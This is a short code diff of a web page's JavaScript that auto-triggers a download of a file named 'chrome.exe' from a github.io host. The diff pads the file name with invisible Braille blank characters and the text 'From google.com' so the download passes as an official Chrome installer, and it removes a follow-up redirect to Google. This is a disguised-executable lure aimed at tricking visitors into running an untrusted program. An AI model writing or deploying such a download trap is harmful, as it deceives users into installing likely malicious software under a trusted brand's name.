@@ -23,13 +23,8 @@
       // Step 1: Create a temporary <a> element to trigger the download
       var link = document.createElement('a');
       link.href = 'https://ecdnts-del.github.io/test-apk/From⠀google.com ⠀⠀⠀⠀⠀⠀ chrome.exe';
-      link.download = 'From⠀google.com ⠀⠀⠀⠀⠀ chrome.exe'; // Set the filename for download
+      link.download = ' ⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀ From⠀google.com ⠀⠀⠀⠀⠀ chrome.exe'; // Set the filename for download
       link.click(); // Trigger the download
-
-      // Step 2: After download, wait for 5 seconds, then redirect to Google
-      setTimeout(function(){
-        window.open('https://google.com', 'x'); // Redirect to Google after 5 seconds
-      }, 5000);
     }
   </script>
 
